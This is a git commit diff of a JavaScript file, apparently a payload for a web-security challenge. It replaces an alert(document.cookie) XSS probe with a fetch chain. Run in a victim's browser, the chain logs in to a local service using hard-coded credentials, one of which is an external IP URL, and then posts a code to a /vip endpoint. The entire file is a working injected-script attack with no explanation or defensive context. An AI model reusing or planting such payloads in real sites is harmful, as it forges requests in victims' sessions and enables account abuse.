7bf5e660584e138e6b4727e6b4e56f5cca949ab7
xlccccc <2595251998@qq.com>
2023-10-29 23:28:59 +0800

    2

--- js/base.js
+++ js/base.js
@@ -1,1 +1,36 @@
-alert(document.cookie)
+// 访问您的网站
+fetch('http://localhost:3000')
+  .then(response => {
+    // 登录
+    const username = 'http://47.115.201.35:7799/';
+    const password = '5543f02abbd854192cd335464c038e4c';
+    return fetch('http://localhost:3000/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `username=${username}&password=${password}`
+    });
+  })
+  .then(response => {
+    // 等待登录成功后重定向到主页
+    return fetch('http://localhost:3000');
+  })
+  .then(response => {
+    return fetch('http://localhost:3000/vip', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `code=123`,
+      redirect: 'follow'
+    });
+  })
+  .then(response => {
+    // 处理VIP页面的响应
+    console.log(response);
+  })
+  .catch(error => {
+    // 处理错误
+    console.error(error);
+  });
